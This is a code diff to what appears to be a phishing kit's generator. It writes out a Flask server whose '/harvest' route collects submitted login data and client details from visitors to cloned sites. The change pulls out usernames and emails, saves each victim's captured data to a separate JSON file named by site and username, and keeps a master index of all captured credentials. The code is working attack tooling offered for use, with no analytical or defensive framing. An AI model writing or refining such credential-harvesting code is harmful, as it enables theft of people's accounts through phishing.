@@ -12,6 +12,7 @@ def launch_flask_server(site_root, main_file_rel, site_credentials_dir, port=808
     server_script = f"""
 from flask import Flask, request, send_file, send_from_directory, jsonify, abort, make_response
 import os, json, datetime
+import re
 
 app = Flask(__name__)
 SITE_ROOT = r"{os.path.abspath(site_root)}"
@@ -72,28 +73,80 @@ def get_client_info():
     
     return info
 
+def extract_username_from_data(data):
+    username_keys = ['username', 'user', 'email', 'login', 'user_id', 'name', 'account']
+    for key in username_keys:
+        if key in data and data[key] and str(data[key]).strip():
+            username = str(data[key]).strip()
+            # Clean the username for filename safety
+            username = re.sub(r'[<>:"/\\\\|?*]', '_', username)
+            username = username.replace(' ', '_')
+            if len(username) > 50:
+                username = username[:50]
+            return username
+    return "unknown"
+
 def save_credentials(data):
     os.makedirs(CREDS_DIR, exist_ok=True)
-    creds_file = os.path.join(CREDS_DIR, "result.json")
-    try:
-        if os.path.exists(creds_file):
-            with open(creds_file, 'r') as f:
-                creds = json.load(f)
-        else:
-            creds = []
-    except:
-        creds = []
     
+    # Extract username from data
+    username = extract_username_from_data(data)
+    
+    # Get site name from directory name
+    site_name = os.path.basename(CREDS_DIR)
+    
+    # Generate timestamp with microseconds for uniqueness
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
+    
+    # Create safe filename
+    safe_username = "".join(c for c in username if c.isalnum() or c in '._-')
+    filename = f"{{site_name}}_{{safe_username}}_{{timestamp}}.json"
+    creds_file = os.path.join(CREDS_DIR, filename)
+    
+    # Create the credential entry
     entry = {{
+        "id": filename.replace('.json', ''),
         "timestamp": str(datetime.datetime.now()),
         "data": data,
         "client_info": get_client_info()
     }}
     
-    creds.append(entry)
+    # Save to individual file
     with open(creds_file, 'w') as f:
-        json.dump(creds, f, indent=2)
-    return True
+        json.dump(entry, f, indent=2)
+    
+    # Update master index file
+    index_file = os.path.join(CREDS_DIR, "all_credentials_index.json")
+    try:
+        if os.path.exists(index_file):
+            with open(index_file, 'r') as f:
+                index_data = json.load(f)
+        else:
+            index_data = []
+    except:
+        index_data = []
+    
+    # Create summary for index
+    data_summary = {{}}
+    for key, value in data.items():
+        if isinstance(value, (str, int, float, bool)):
+            val_str = str(value)
+            data_summary[key] = val_str[:50] + "..." if len(val_str) > 50 else val_str
+    
+    index_entry = {{
+        "file": filename,
+        "timestamp": str(datetime.datetime.now()),
+        "username": username,
+        "site": site_name,
+        "data_summary": data_summary
+    }}
+    
+    index_data.append(index_entry)
+    with open(index_file, 'w') as f:
+        json.dump(index_data, f, indent=2)
+    
+    print(f"[*] Credential saved to {{filename}}")
+    return filename
 
 @app.route('/')
 def index():
@@ -143,11 +196,11 @@ def harvest():
         if (not data or not isinstance(data, dict) or not data) and request.data:
             data = request.data.decode('utf-8', errors='ignore')
         if data and isinstance(data, dict) and data:
-            save_credentials(data)
-            return jsonify({{"status": "success"}}), 200
+            filename = save_credentials(data)
+            return jsonify({{"status": "success", "file": filename}}), 200
         elif isinstance(data, str) and data.strip():
-            save_credentials({{"raw": data.strip()}})
-            return jsonify({{"status": "raw_saved"}}), 200
+            filename = save_credentials({{"raw": data.strip()}})
+            return jsonify({{"status": "raw_saved", "file": filename}}), 200
         else:
             return jsonify({{"status": "empty"}}), 400
     except Exception as e:
